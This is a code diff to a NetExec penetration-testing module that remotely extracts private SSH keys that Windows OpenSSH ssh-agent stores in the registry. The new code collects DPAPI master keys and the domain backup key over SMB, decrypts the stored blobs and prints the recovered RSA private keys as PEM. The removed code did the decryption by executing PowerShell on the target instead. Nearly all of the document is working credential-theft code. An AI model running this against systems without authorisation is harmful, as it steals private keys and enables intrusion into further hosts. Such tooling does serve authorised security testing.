@@ -1,37 +1,25 @@
-#!/usr/bin/env python3
-r"""
-Module to extract unencrypted private SSH keys from Windows OpenSSH ssh-agent registry entries.
-
-When adding private keys to ssh-agent, Windows protects the private keys with DPAPI and stores 
-them as registry entries under HKCU:\Software\OpenSSH\Agent\Keys
-
-With elevated privileges, it is possible to pull out the binary blobs from the registry and 
-unprotect them using DPAPI. These blobs can then be restructured into the original, unencrypted 
-private RSA keys.
-
-Original Python implementation credit: soleblaze
-https://github.com/NetSPI/sshkey-grab/blob/master/parse_mem.py
-"""
-
 import base64
-from base64 import b64encode
+import traceback
+from dploot.lib.target import Target
 from impacket.dcerpc.v5.rpcrt import DCERPCException
 from impacket.dcerpc.v5 import rrp
+from impacket.dpapi import DPAPI_BLOB
 from impacket.examples.secretsdump import RemoteOperations
+from impacket.uuid import bin_to_string
 from nxc.helpers.misc import CATEGORY
-
-try:
-    from pyasn1.type import univ
-    from pyasn1.codec.der import encoder
-    HAS_PYASN1 = True
-except ImportError:
-    HAS_PYASN1 = False
+from nxc.protocols.smb.dpapi import collect_masterkeys_from_target, get_domain_backup_key, upgrade_to_dploot_connection
+from pyasn1.type import univ
+from pyasn1.codec.der import encoder
 
 
 class NXCModule:
     """
     Extracts unencrypted private SSH keys from Windows OpenSSH ssh-agent registry entries.
-    Module by @mverschu (adapted for NetExec)
+    Keys are DPAPI-protected in HKCU:\\Software\\OpenSSH\\Agent\\Keys.
+
+    Authors:
+      mverschu: @mverschu (adapted for NetExec)
+      soleblaze: https://github.com/NetSPI/sshkey-grab/blob/master/parse_mem.py
     """
 
     name = "ssh_keys"
@@ -50,12 +38,72 @@ class NXCModule:
             self.outputfile = module_options["OUTPUTFILE"]
 
     def on_admin_login(self, context, connection):
-        if not HAS_PYASN1:
-            context.log.fail("pyasn1 package is required. Install it with: pip install pyasn1")
+        context.log.display("Extracting SSH keys from registry...")
+
+        # Ensure connection has required attributes for DPAPI (no command execution - SMB/registry only)
+        if not hasattr(connection, "pvkbytes"):
+            connection.pvkbytes = None
+        if not hasattr(connection, "no_da"):
+            connection.no_da = None
+        if not hasattr(connection, "args"):
+            class Args:
+                mkfile = None
+                local_auth = False
+            connection.args = Args()
+        elif not hasattr(connection.args, "mkfile"):
+            connection.args.mkfile = None
+        if not hasattr(connection.args, "local_auth"):
+            connection.args.local_auth = False
+        for attr in ("password", "nthash", "lmhash"):
+            if not hasattr(connection, attr):
+                setattr(connection, attr, "")
+
+        if connection.pvkbytes is None:
+            connection.pvkbytes = get_domain_backup_key(connection)
+            if connection.pvkbytes is False:
+                connection.pvkbytes = None
+
+        domain = connection.domain
+        username = connection.username
+        password = getattr(connection, "password", "") or ""
+        lmhash = getattr(connection, "lmhash", "") or ""
+        nthash = getattr(connection, "nthash", "") or ""
+        kerberos = connection.kerberos
+        aesKey = connection.aesKey
+        use_kcache = getattr(connection, "use_kcache", False)
+        remote_name = getattr(connection, "remoteName", connection.host if not kerberos else connection.hostname + "." + connection.domain)
+
+        target = Target.create(
+            domain=domain,
+            username=username,
+            password=password,
+            target=remote_name,
+            lmhash=lmhash,
+            nthash=nthash,
+            do_kerberos=kerberos,
+            aesKey=aesKey,
+            no_pass=True,
+            use_kcache=use_kcache,
+        )
+
+        dploot_conn = upgrade_to_dploot_connection(target=target, connection=connection.conn)
+        if dploot_conn is None:
+            context.log.fail("Could not upgrade connection for dploot")
             return
 
-        context.log.display("Extracting SSH keys from registry...")
-        
+        try:
+            masterkeys = collect_masterkeys_from_target(connection, target, dploot_conn, user=True, system=True)
+        except Exception as e:
+            context.log.fail(f"Exception while collecting master keys: {e}")
+            context.log.debug(traceback.format_exc())
+            return
+
+        if len(masterkeys) == 0:
+            context.log.fail("No masterkeys looted, cannot decrypt SSH keys")
+            return
+
+        context.log.success(f"Collected {len(masterkeys)} master key(s) for DPAPI decryption")
+
         remote_ops = RemoteOperations(connection.conn, False)
         remote_ops.enableRegistry()
 
@@ -79,17 +127,18 @@ class NXCModule:
                 return
 
             # Enumerate all subkeys (each represents a stored SSH key)
+            # Registry enumeration: iterate until DCERPCException (no more keys)
             key_names = []
             i = 0
             while True:
                 try:
                     ans = rrp.hBaseRegEnumKey(remote_ops._RemoteOperations__rrp, key_handle, i)
-                    key_name = ans["lpNameOut"].rstrip("\x00")
+                    key_name = ans["lpNameOut"].rstrip("\x00")  # Remove null terminator
                     if key_name:
                         key_names.append(key_name)
                     i += 1
                 except DCERPCException:
-                    break
+                    break  # No more keys to enumerate
 
             if not key_names:
                 context.log.info("No SSH keys found in registry")
@@ -136,29 +185,17 @@ class NXCModule:
                             context.log.debug(f"Could not read comment: {e}")
                             comment = key_name
 
-                        # Convert encrypted data to base64 for PowerShell processing
-                        if isinstance(enc_data, bytes):
-                            enc_data_b64 = base64.b64encode(enc_data).decode('utf-8')
-                        elif isinstance(enc_data, list):
-                            # Registry binary data is often returned as a list of bytes
+                        # Convert encrypted data to bytes
+                        if isinstance(enc_data, list):
                             enc_data = b''.join(enc_data) if enc_data else b''
-                            enc_data_b64 = base64.b64encode(enc_data).decode('utf-8')
-                        else:
-                            # Try to convert to bytes
-                            try:
-                                enc_data = bytes(enc_data)
-                                enc_data_b64 = base64.b64encode(enc_data).decode('utf-8')
-                            except Exception as e:
-                                context.log.debug(f"Error converting registry data to bytes: {e}")
-                                raise
-                        
-                        context.log.debug(f"Encrypted data base64 length: {len(enc_data_b64)}")
+                        elif not isinstance(enc_data, bytes):
+                            enc_data = bytes(enc_data)
 
-                        # Decrypt using DPAPI via PowerShell
                         context.log.debug(f"Decrypting key: {comment}")
-                        decrypted_b64 = self._decrypt_dpapi(context, connection, enc_data_b64)
-                        
-                        if decrypted_b64:
+                        decrypted_data = self._decrypt_dpapi_remote(context, enc_data, masterkeys)
+
+                        if decrypted_data:
+                            decrypted_b64 = base64.b64encode(decrypted_data).decode('utf-8')
                             extracted_keys.append({
                                 "comment": comment,
                                 "data": decrypted_b64
@@ -193,7 +230,9 @@ class NXCModule:
                     private_key = self._extract_rsa_key(key_data["data"])
                     if private_key:
                         context.log.highlight(f"[+] Key Comment: {key_data['comment']}")
-                        context.log.highlight(private_key)
+                        # Display key with proper indentation
+                        for line in private_key.splitlines():
+                            context.log.highlight(f"    {line}")
                         context.log.display("")
                         
                         # Store for file output
@@ -223,98 +262,50 @@ class NXCModule:
 
         except Exception as e:
             context.log.fail(f"Error extracting SSH keys: {e}")
-            import traceback
             context.log.debug(traceback.format_exc())
         finally:
             remote_ops.finish()
 
-    def _decrypt_dpapi(self, context, connection, enc_data_b64):
+    def _normalize_guid(self, guid):
+        """Normalize GUID for comparison: strip braces, lowercase."""
+        if guid is None:
+            return ""
+        return str(guid).strip("{}").lower()
+
+    def _decrypt_dpapi_remote(self, context, enc_data, masterkeys):
         """
-        Decrypt DPAPI-protected data using PowerShell on the remote system.
-        Uses CurrentUser scope as required for HKCU registry data.
+        Decrypt DPAPI-protected data using master keys collected via SMB (no command execution).
+        Uses RemoteOperations + dploot: registry read + SMB file read only.
         """
-        # PowerShell command to decrypt using DPAPI
-        # Using single quotes to avoid issues with special characters in base64
-        ps_command = f"""
-$ProgressPreference = 'SilentlyContinue';
-Add-Type -AssemblyName System.Security;
-try {{
-    $encdata = [System.Convert]::FromBase64String('{enc_data_b64}');
-    $decdata = [Security.Cryptography.ProtectedData]::Unprotect($encdata, $null, 'CurrentUser');
-    $b64key = [System.Convert]::ToBase64String($decdata);
-    Write-Output $b64key;
-}} catch {{
-    Write-Output "ERROR: $($_.Exception.Message)";
-    Write-Output "ERROR_TYPE: $($_.Exception.GetType().FullName)";
-}}
-"""
-        try:
-            # Try ps_execute first
-            output = connection.ps_execute(ps_command, get_output=True)
-            context.log.debug(f"Raw ps_execute output type: {type(output)}, value: {str(output)[:200] if output else 'None'}")
-            
-            # Handle tuple output (stdout, stderr)
-            if isinstance(output, tuple):
-                stdout, stderr = output
-                context.log.debug(f"stdout: {str(stdout)[:200] if stdout else 'None'}, stderr: {str(stderr)[:200] if stderr else 'None'}")
-                output = stdout if stdout else stderr
-            
-            # Convert to string if needed
-            if output and not isinstance(output, str):
-                if isinstance(output, bytes):
-                    output = output.decode('utf-8', errors='ignore')
-                else:
-                    output = str(output)
-            
-            # If ps_execute didn't work, try execute() with base64-encoded script
-            if not output or output.strip() == "":
-                context.log.debug("ps_execute returned empty output, trying execute() with base64-encoded script")
-                ps_script_b64 = b64encode(ps_command.encode("UTF-16LE")).decode("utf-8")
-                output = connection.execute(f"powershell.exe -e {ps_script_b64} -OutputFormat Text", True)
-                context.log.debug(f"execute() output type: {type(output)}, length: {len(output) if output else 0}")
-            
-            if not output:
-                context.log.debug("Empty output from PowerShell decryption")
-                return None
-            
-            # Handle string output from execute()
-            if isinstance(output, bytes):
-                output = output.decode('utf-8', errors='ignore')
-            elif not isinstance(output, str):
-                output = str(output)
-            
-            output = output.strip()
-            
-            # Handle CLIXML format (PowerShell serialization)
-            if "CLIXML" in output:
-                parts = output.split("CLIXML")
-                if len(parts) > 1:
-                    output = parts[1].split("<Objs Version")[0].strip()
-            
-            # Check for error messages
-            if output.startswith("ERROR:"):
-                error_msg = output
-                context.log.debug(f"DPAPI decryption error: {error_msg}")
-                return None
-            
-            # Validate it's base64
-            try:
-                decoded = base64.b64decode(output)
-                if len(decoded) == 0:
-                    context.log.debug("Decoded base64 is empty")
-                    return None
-                context.log.debug(f"Successfully decrypted {len(decoded)} bytes")
-            except Exception as e:
-                context.log.debug(f"Output is not valid base64: {e}")
-                context.log.debug(f"Output preview (first 200 chars): {output[:200]}")
-                return None
-            
-            return output
-        except Exception as e:
-            context.log.debug(f"Error executing PowerShell decryption: {e}")
-            import traceback
-            context.log.debug(traceback.format_exc())
+        if not masterkeys:
             return None
+        try:
+            blob = DPAPI_BLOB(enc_data)
+            guid_masterkey = self._normalize_guid(bin_to_string(blob["GuidMasterKey"]))
+            available_guids = []
+            right_key = None
+            for mk in masterkeys:
+                guid, key = None, None
+                if hasattr(mk, "guid") and hasattr(mk, "key") and mk.key is not None:
+                    guid = self._normalize_guid(mk.guid)
+                    key = mk.key
+                elif isinstance(mk, tuple) and len(mk) >= 2:
+                    guid = self._normalize_guid(mk[0])
+                    key = mk[1]
+                if guid:
+                    available_guids.append((guid, getattr(mk, "user", None)))
+                if guid and key and guid == guid_masterkey:
+                    right_key = key
+                    break
+            if right_key is not None:
+                decrypted = blob.decrypt(right_key)
+                return decrypted
+            context.log.info(f"No matching master key: blob needs {guid_masterkey}")
+            context.log.debug(f"Available masterkeys (guid, user): {available_guids}")
+        except Exception as e:
+            context.log.debug(f"DPAPI decryption error: {e}")
+            context.log.debug(traceback.format_exc())
+        return None
 
     def _extract_rsa_key(self, data):
         """
@@ -329,57 +320,63 @@ try {{
             
             keybytes = keybytes[offset:]
 
-            # Extract RSA key components
-            start = 10
-            size = self._get_int(keybytes[start:(start+2)])
+            # Extract RSA key components from binary format
+            # Format: [4 bytes: "ssh-rsa" length][7 bytes: "ssh-rsa"][2 bytes: n size][n bytes: n][2 bytes: e size][e bytes: e]...
+            start = 10  # Skip "ssh-rsa" (4+7 bytes) and start reading components
+            # Each component is prefixed with 2-byte big-endian size
+            size = int.from_bytes(keybytes[start:(start+2)], byteorder='big')
             start += 2
-            n = self._get_int(keybytes[start:(start+size)])
+            n = int.from_bytes(keybytes[start:(start+size)], byteorder='big')  # Modulus
             start = start + size + 2
-            size = self._get_int(keybytes[start:(start+2)])
+            size = int.from_bytes(keybytes[start:(start+2)], byteorder='big')
             start += 2
-            e = self._get_int(keybytes[start:(start+size)])
+            e = int.from_bytes(keybytes[start:(start+size)], byteorder='big')  # Public exponent
             start = start + size + 2
-            size = self._get_int(keybytes[start:(start+2)])
+            size = int.from_bytes(keybytes[start:(start+2)], byteorder='big')
             start += 2
-            d = self._get_int(keybytes[start:(start+size)])
+            d = int.from_bytes(keybytes[start:(start+size)], byteorder='big')  # Private exponent
             start = start + size + 2
-            size = self._get_int(keybytes[start:(start+2)])
+            size = int.from_bytes(keybytes[start:(start+2)], byteorder='big')
             start += 2
-            c = self._get_int(keybytes[start:(start+size)])
+            c = int.from_bytes(keybytes[start:(start+size)], byteorder='big')  # Coefficient (q^-1 mod p)
             start = start + size + 2
-            size = self._get_int(keybytes[start:(start+2)])
+            size = int.from_bytes(keybytes[start:(start+2)], byteorder='big')
             start += 2
-            p = self._get_int(keybytes[start:(start+size)])
+            p = int.from_bytes(keybytes[start:(start+size)], byteorder='big')  # Prime 1
             start = start + size + 2
-            size = self._get_int(keybytes[start:(start+2)])
+            size = int.from_bytes(keybytes[start:(start+2)], byteorder='big')
             start += 2
-            q = self._get_int(keybytes[start:(start+size)])
+            q = int.from_bytes(keybytes[start:(start+size)], byteorder='big')  # Prime 2
 
-            e1 = d % (p - 1)
-            e2 = d % (q - 1)
+            # Calculate CRT exponents (used for faster decryption)
+            e1 = d % (p - 1)  # d mod (p-1)
+            e2 = d % (q - 1)  # d mod (q-1)
 
-            # Construct ASN.1 structure
+            # Construct ASN.1 structure for PKCS#1 RSA private key format
+            # Sequence contains: version(0), n, e, d, p, q, e1, e2, c
             seq = (
-                univ.Integer(0),
-                univ.Integer(n),
-                univ.Integer(e),
-                univ.Integer(d),
-                univ.Integer(p),
-                univ.Integer(q),
-                univ.Integer(e1),
-                univ.Integer(e2),
-                univ.Integer(c),
+                univ.Integer(0),  # Version
+                univ.Integer(n),  # Modulus
+                univ.Integer(e),  # Public exponent
+                univ.Integer(d),  # Private exponent
+                univ.Integer(p),  # Prime 1
+                univ.Integer(q),  # Prime 2
+                univ.Integer(e1), # Exponent 1 (d mod (p-1))
+                univ.Integer(e2), # Exponent 2 (d mod (q-1))
+                univ.Integer(c),  # Coefficient (q^-1 mod p)
             )
 
+            # Build ASN.1 sequence structure
             struct = univ.Sequence()
             for i in range(len(seq)):
                 struct.setComponentByPosition(i, seq[i])
             
+            # Encode to DER format and base64 encode
             raw = encoder.encode(struct)
             data_b64 = base64.b64encode(raw).decode('utf-8')
 
-            # Format as PEM
-            width = 64
+            # Format as PEM (base64 with 64-char lines, wrapped in headers)
+            width = 64  # PEM standard: 64 characters per line
             chopped = [data_b64[i:i + width] for i in range(0, len(data_b64), width)]
             top = "-----BEGIN RSA PRIVATE KEY-----\n"
             content = "\n".join(chopped)
@@ -389,8 +386,3 @@ try {{
         except Exception as e:
             # Note: context not available here, but errors are handled by caller
             return None
-
-    def _get_int(self, buf):
-        """Convert bytes to big-endian integer."""
-        return int.from_bytes(buf, byteorder='big')
-
